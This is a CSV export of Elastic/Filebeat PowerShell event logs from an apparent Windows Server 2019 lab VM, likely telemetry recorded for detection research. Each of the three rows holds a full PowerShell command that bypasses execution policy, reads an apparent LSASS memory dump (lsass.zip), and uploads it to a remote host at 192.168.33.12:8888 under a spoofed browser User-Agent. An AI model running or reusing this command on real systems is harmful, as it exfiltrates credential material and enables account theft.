@timestamp,_score,agent.ephemeral_id,agent.hostname,agent.id,agent.name,agent.type,agent.version,data_stream.dataset,data_stream.namespace,data_stream.type,ecs.version,elastic_agent.id,elastic_agent.snapshot,elastic_agent.version,event.action,event.agent_id_status,event.category,event.code,event.created,event.dataset,event.ingested,event.kind,event.module,event.provider,event.type,file.code_signature.status,file.code_signature.subject_name,file.code_signature.valid,file.directory,file.extension,file.hash.md5,file.hash.sha1,file.hash.sha256,file.name,file.path,file.pe.company,file.pe.description,file.pe.file_version,file.pe.imphash,file.pe.original_file_name,file.pe.product,host.architecture,host.hostname,host.id,host.ip,host.mac,host.name,host.os.build,host.os.family,host.os.kernel,host.os.name,host.os.name.text,host.os.platform,host.os.type,host.os.version,input.type,log.file.path,log.level,log.logger,log.offset,log.origin.file.line,log.origin.file.name,message,monitoring.ecs.version,monitoring.metrics.beat.cpu.system.ticks,monitoring.metrics.beat.cpu.system.time.ms,monitoring.metrics.beat.cpu.total.ticks,monitoring.metrics.beat.cpu.total.time.ms,monitoring.metrics.beat.cpu.total.value,monitoring.metrics.beat.cpu.user.ticks,monitoring.metrics.beat.cpu.user.time.ms,monitoring.metrics.beat.handles.open,monitoring.metrics.beat.info.ephemeral_id,monitoring.metrics.beat.info.uptime.ms,monitoring.metrics.beat.info.version,monitoring.metrics.beat.memstats.gc_next,monitoring.metrics.beat.memstats.memory_alloc,monitoring.metrics.beat.memstats.memory_total,monitoring.metrics.beat.memstats.rss,monitoring.metrics.beat.runtime.goroutines,monitoring.metrics.filebeat.events.active,monitoring.metrics.filebeat.events.added,monitoring.metrics.filebeat.events.done,monitoring.metrics.filebeat.harvester.open_files,monitoring.metrics.filebeat.harvester.running,monitoring.metrics.libbeat.config.module.running,monitoring.metrics.libbeat.output.events.acked,monitoring.metrics.libbeat.output.events.active,monitoring.metrics.libbeat.output.events.batches,monitoring.metrics.libbeat.output.events.total,monitoring.metrics.libbeat.output.read.bytes,monitoring.metrics.libbeat.output.read.errors,monitoring.metrics.libbeat.output.write.bytes,monitoring.metrics.libbeat.pipeline.clients,monitoring.metrics.libbeat.pipeline.events.active,monitoring.metrics.libbeat.pipeline.events.published,monitoring.metrics.libbeat.pipeline.events.total,monitoring.metrics.libbeat.pipeline.queue.acked,monitoring.metrics.metricbeat.windows.perfmon.events,monitoring.metrics.metricbeat.windows.perfmon.success,monitoring.metrics.metricbeat.windows.service.events,monitoring.metrics.metricbeat.windows.service.success,monitoring.metrics.registrar.states.current,process.args,process.args_count,process.command_line,process.entity_id,process.executable,process.hash.md5,process.hash.sha1,process.hash.sha256,process.name,process.parent.args,process.parent.args_count,process.parent.command_line,process.parent.entity_id,process.parent.executable,process.parent.name,process.parent.pid,process.pe.company,process.pe.description,process.pe.file_version,process.pe.imphash,process.pe.original_file_name,process.pe.product,process.pid,process.thread.id,process.working_directory,registry.data.strings,registry.data.type,registry.hive,registry.key,registry.path,registry.value,related.hash,related.user,rule.name,service.name,sysmon.file.archived,sysmon.file.is_executable,user.domain,user.id,user.name,winlog.api,winlog.channel,winlog.computer_name,winlog.event_data.CallTrace,winlog.event_data.Company,winlog.event_data.CreationUtcTime,winlog.event_data.Description,winlog.event_data.EventType,winlog.event_data.FileVersion,winlog.event_data.GrantedAccess,winlog.event_data.IntegrityLevel,winlog.event_data.LogonGuid,winlog.event_data.LogonId,winlog.event_data.ParentUser,winlog.event_data.Product,winlog.event_data.Signature,winlog.event_data.SignatureStatus,winlog.event_data.Signed,winlog.event_data.SourceUser,winlog.event_data.TargetImage,winlog.event_data.TargetProcessGUID,winlog.event_data.TargetProcessId,winlog.event_data.TargetUser,winlog.event_data.TerminalSessionId,winlog.event_id,winlog.opcode,winlog.process.pid,winlog.process.thread.id,winlog.provider_guid,winlog.provider_name,winlog.record_id,winlog.task,winlog.user.domain,winlog.user.identifier,winlog.user.name,winlog.user.type,winlog.version
"Oct 21, 2022 @ 03:08:25.732",-,ecd05dc1-8bd4-4b91-af72-a43af352c71e,vagrant,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,vagrant,filebeat,7.17.6,windows.powershell,default,logs,8.0.0,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,false,7.17.6,Engine Lifecycle,verified,process,403,"Oct 21, 2022 @ 03:08:26.762",windows.powershell,"Oct 21, 2022 @ 03:08:49.000",event,windows,PowerShell,17,end,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,x86_64,vagrant,7a53022b-14a5-4000-983d-b77eea66f342,"fe80::5069:29a8:d50:ec, 10.0.2.15, fe80::55ef:63f:8ff2:2526, 192.168.33.11, fe80::19f3:c4e1:10ab:4603, 172.26.128.1","08:00:27:7a:a2:fc, 08:00:27:cf:63:d3, 00:15:5d:95:9d:54",vagrant,17763.1935,windows,10.0.17763.1935 (WinBuild.160101.0800),Windows Server 2019 Datacenter Evaluation,Windows Server 2019 Datacenter Evaluation,windows,windows,10.0,winlog,-,information,-,-,-,-,"Engine state is changed from Available to Stopped. 

Details: 
	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=17

	HostName=ConsoleHost
	HostVersion=5.1.17763.1852
	HostId=41289939-8716-49c9-9f2c-1b307dfe45d7
	HostApplication=powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); 
	EngineVersion=5.1.17763.1852
	RunspaceId=bde48661-68d6-4497-8031-ceecb4afd9c6
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,Stopped,Available,5.1.17763.1852,-,-,-,-,5.1.17763.1852,-,-,bde48661-68d6-4497-8031-ceecb4afd9c6,-,-,"powershell.exe, -ExecutionPolicy, Bypass, -C, $ErrorActionPreference, =, 'Stop';, $fieldName, =, lsass.zip;, $filePath, =, C:\Users\Public\lsass.zip;, $url, =, http://192.168.33.12:8888/file/upload;, Add-Type, -AssemblyName, 'System.Net.Http';, $client, =, New-Object, System.Net.Http.HttpClient;, $content, =, New-Object, System.Net.Http.MultipartFormDataContent;, $fileStream, =, [System.IO.File]::OpenRead($filePath);, $fileName, =, [System.IO.Path]::GetFileName($filePath);, $fileContent, =, New-Object, System.Net.Http.StreamContent($fileStream);, $content.Add($fileContent,, $fieldName,, $fileName);, $client.DefaultRequestHeaders.Add(X-Request-Id,, $env:COMPUTERNAME, +, '-mykdsa');, $client.DefaultRequestHeaders.Add(User-Agent,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36);, $result, =, $client.PostAsync($url,, $content).Result;, $result.EnsureSuccessStatusCode();",50,"powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); ",41289939-8716-49c9-9f2c-1b307dfe45d7,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,vagrant,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,403,Classic,Info,-,-,-,PowerShell,1552,Engine Lifecycle,-,-,-,-,-
"Oct 21, 2022 @ 03:08:25.518",-,ecd05dc1-8bd4-4b91-af72-a43af352c71e,vagrant,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,vagrant,filebeat,7.17.6,windows.powershell_operational,default,logs,8.0.0,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,false,7.17.6,Executing Pipeline,verified,process,4103,"Oct 21, 2022 @ 03:08:27.012",windows.powershell_operational,"Oct 21, 2022 @ 03:08:50.000",event,windows,Microsoft-Windows-PowerShell,16,info,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,x86_64,vagrant,7a53022b-14a5-4000-983d-b77eea66f342,"fe80::5069:29a8:d50:ec, 10.0.2.15, fe80::55ef:63f:8ff2:2526, 192.168.33.11, fe80::19f3:c4e1:10ab:4603, 172.26.128.1","08:00:27:7a:a2:fc, 08:00:27:cf:63:d3, 00:15:5d:95:9d:54",vagrant,17763.1935,windows,10.0.17763.1935 (WinBuild.160101.0800),Windows Server 2019 Datacenter Evaluation,Windows Server 2019 Datacenter Evaluation,windows,windows,10.0,winlog,-,information,-,-,-,-,"CommandInvocation(Add-Type): ""Add-Type""
ParameterBinding(Add-Type): name=""AssemblyName""; value=""System.Net.Http""


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.1852
        Host ID = 41289939-8716-49c9-9f2c-1b307dfe45d7
        Host Application = powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); 
        Engine Version = 5.1.17763.1852
        Runspace ID = bde48661-68d6-4497-8031-ceecb4afd9c6
        Pipeline ID = 4
        Command Name = Add-Type
        Command Type = Cmdlet
        Script Name = 
        Command Path = 
        Sequence Number = 16
        User = VAGRANT\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:",-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,"""AssemblyName""","Add-Type, Add-Type","CommandInvocation, ParameterBinding","""Add-Type"", ""System.Net.Http""",Add-Type,Cmdlet,-,-,-,5.1.17763.1852,-,-,Microsoft.PowerShell,4,5.1.17763.1852,-,-,bde48661-68d6-4497-8031-ceecb4afd9c6,-,-,"powershell.exe, -ExecutionPolicy, Bypass, -C, $ErrorActionPreference, =, 'Stop';, $fieldName, =, lsass.zip;, $filePath, =, C:\Users\Public\lsass.zip;, $url, =, http://192.168.33.12:8888/file/upload;, Add-Type, -AssemblyName, 'System.Net.Http';, $client, =, New-Object, System.Net.Http.HttpClient;, $content, =, New-Object, System.Net.Http.MultipartFormDataContent;, $fileStream, =, [System.IO.File]::OpenRead($filePath);, $fileName, =, [System.IO.Path]::GetFileName($filePath);, $fileContent, =, New-Object, System.Net.Http.StreamContent($fileStream);, $content.Add($fileContent,, $fieldName,, $fileName);, $client.DefaultRequestHeaders.Add(X-Request-Id,, $env:COMPUTERNAME, +, '-mykdsa');, $client.DefaultRequestHeaders.Add(User-Agent,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36);, $result, =, $client.PostAsync($url,, $content).Result;, $result.EnsureSuccessStatusCode();",50,"powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode();",41289939-8716-49c9-9f2c-1b307dfe45d7,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,ConsoleHost,-,-,-,-,-,-,-,-,vagrant,-,-,-,-,VAGRANT,S-1-5-21-31245427-1393067093-28759700-1000,vagrant,{854ef8cf-e546-0001-c924-4f8546e5d801},wineventlog,Microsoft-Windows-PowerShell/Operational,vagrant,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,4103,-,To be used when operation is just executing a method,"7,036","7,212",{a0c1853b-5c40-4b15-8766-3cf1c58f985a},Microsoft-Windows-PowerShell,837,Executing Pipeline,VAGRANT,S-1-5-21-31245427-1393067093-28759700-1000,vagrant,User,1
"Oct 21, 2022 @ 03:08:25.511",-,ecd05dc1-8bd4-4b91-af72-a43af352c71e,vagrant,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,vagrant,filebeat,7.17.6,windows.powershell,default,logs,8.0.0,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,false,7.17.6,Pipeline Execution Details,verified,process,800,"Oct 21, 2022 @ 03:08:26.762",windows.powershell,"Oct 21, 2022 @ 03:08:49.000",event,windows,PowerShell,15,info,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,x86_64,vagrant,7a53022b-14a5-4000-983d-b77eea66f342,"fe80::5069:29a8:d50:ec, 10.0.2.15, fe80::55ef:63f:8ff2:2526, 192.168.33.11, fe80::19f3:c4e1:10ab:4603, 172.26.128.1","08:00:27:7a:a2:fc, 08:00:27:cf:63:d3, 00:15:5d:95:9d:54",vagrant,17763.1935,windows,10.0.17763.1935 (WinBuild.160101.0800),Windows Server 2019 Datacenter Evaluation,Windows Server 2019 Datacenter Evaluation,windows,windows,10.0,winlog,-,information,-,-,-,-,"Pipeline execution details for command line: $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); . 

Context Information: 
	DetailSequence=1
	DetailTotal=1

	SequenceNumber=15

	UserId=VAGRANT\vagrant
	HostName=ConsoleHost
	HostVersion=5.1.17763.1852
	HostId=41289939-8716-49c9-9f2c-1b307dfe45d7
	HostApplication=powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); 
	EngineVersion=5.1.17763.1852
	RunspaceId=bde48661-68d6-4497-8031-ceecb4afd9c6
	PipelineId=4
	ScriptName=
	CommandLine=$ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode();  

Details: 
CommandInvocation(Add-Type): ""Add-Type""
